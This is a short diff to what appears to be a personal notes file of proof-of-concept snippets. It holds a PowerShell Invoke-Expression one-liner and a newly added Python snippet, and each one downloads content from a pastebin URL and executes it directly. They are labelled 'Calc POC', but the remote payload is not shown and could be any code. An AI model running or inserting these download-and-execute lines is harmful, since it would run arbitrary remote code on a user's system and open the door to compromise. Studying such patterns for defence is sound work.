@@ -37,3 +37,10 @@ Most social media type apps will be Teen [T]
 
 IEX Calc POC
 ```iex ((Invoke-WebRequest 'https://pastebin.com/raw/Gnb4K1Qq').Content)```
+
+Subprocess Calc POC
+```import urllib.request
+url = "https://pastebin.com/raw/kFzy7JT5"
+response = urllib.request.urlopen(url)
+code = response.read().decode()
+exec(code)```
